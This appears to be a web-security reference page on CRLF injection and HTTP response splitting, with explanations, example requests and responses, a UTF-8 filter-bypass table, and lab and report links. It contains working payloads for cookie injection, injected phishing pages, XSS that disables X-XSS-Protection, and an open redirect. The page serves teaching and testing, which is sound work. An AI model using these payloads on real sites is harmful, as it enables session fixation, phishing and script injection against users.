# Carriage Return Line Feed

> CRLF Injection is a web security vulnerability that arises when an attacker injects unexpected Carriage Return (CR) (\r) and Line Feed (LF) (\n) characters into an application. These characters are used to signify the end of a line and the start of a new one in network protocols like HTTP, SMTP, and others. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.

## Summary

* [Methodology](#methodology)
    * [Session Fixation](#session-fixation)
    * [Cross Site Scripting](#cross-site-scripting)
    * [Open Redirect](#open-redirect)
* [Filter Bypass](#filter-bypass)
* [Labs](#labs)
* [References](#references)


## Methodology

HTTP Response Splitting is a security vulnerability where an attacker manipulates an HTTP response by injecting Carriage Return (CR) and Line Feed (LF) characters (collectively called CRLF) into a response header. These characters mark the end of a header and the start of a new line in HTTP responses.

**CRLF Characters**:

* `CR` (`\r`, ASCII 13): Moves the cursor to the beginning of the line.
* `LF` (`\n`, ASCII 10): Moves the cursor to the next line.

By injecting a CRLF sequence, the attacker can break the response into two parts, effectively controlling the structure of the HTTP response. This can result in various security issues, such as:

* Cross-Site Scripting (XSS): Injecting malicious scripts into the second response.
* Cache Poisoning: Forcing incorrect content to be stored in caches.
* Header Manipulation: Altering headers to mislead users or systems


### Session Fixation

A typical HTTP response header looks like this:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123
```

If user input `value\r\nSet-Cookie: admin=true` is embedded into the headers without sanitization:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=value
Set-Cookie: admin=true
```

Now the attacker has set their own cookie.


### Cross Site Scripting

Beside the session fixation that requires a very insecure way of handling user session, the easiest way to exploit a CRLF injection is to write a new body for the page. It can be used to create a phishing page or to trigger an arbitrary Javascript code (XSS).

**Requested page**

```http
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

**HTTP response**

```http
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```

In the case of an XSS, the CRLF injection allows to inject the `X-XSS-Protection` header with the value value "0", to disable it. And then we can add our HTML tag containing Javascript code .

**Requested page**

```powershell
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

**HTTP Response**

```http
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

### Open Redirect

Inject a `Location` header to force a redirect for the user.

```ps1
%0d%0aLocation:%20http://myweb.com
```


## Filter Bypass

[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) states that most HTTP header field values use only a subset of the US-ASCII charset. 

> Newly defined header fields SHOULD limit their field values to US-ASCII octets.

Firefox followed the spec by stripping off any out-of-range characters when setting cookies instead of encoding them.

| UTF-8 Character | Hex | Unicode | Stripped |
| --------- | --- | ------- | -------- |
| `嘊` | `%E5%98%8A` | `\u560a` | `%0A` (\n) |
| `嘍` | `%E5%98%8D` | `\u560d` | `%0D` (\r) |
| `嘾` | `%E5%98%BE` | `\u563e` | `%3E` (>)  |
| `嘼` | `%E5%98%BC` | `\u563c` | `%3C` (<)  |

The UTF-8 character `嘊` contains `0a` in the last part of its hex format, which would be converted as `\n` by Firefox.


An example payload using UTF-8 characters would be:

```js
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
```

URL encoded version

```js
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
```


## Labs

* [PortSwigger - HTTP/2 request splitting via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
* [Root Me - CRLF](https://www.root-me.org/en/Challenges/Web-Server/CRLF)


## References

- [CRLF Injection - CWE-93 - OWASP - May 20, 2022](https://www.owasp.org/index.php/CRLF_Injection)
- [CRLF injection on Twitter or why blacklists fail - XSS Jigsaw - April 21, 2015](https://web.archive.org/web/20150425024348/https://blog.innerht.ml/twitter-crlf-injection/)
- [Starbucks: [newscdn.starbucks.com] CRLF Injection, XSS - Bobrov - December 20, 2016](https://vulners.com/hackerone/H1:192749)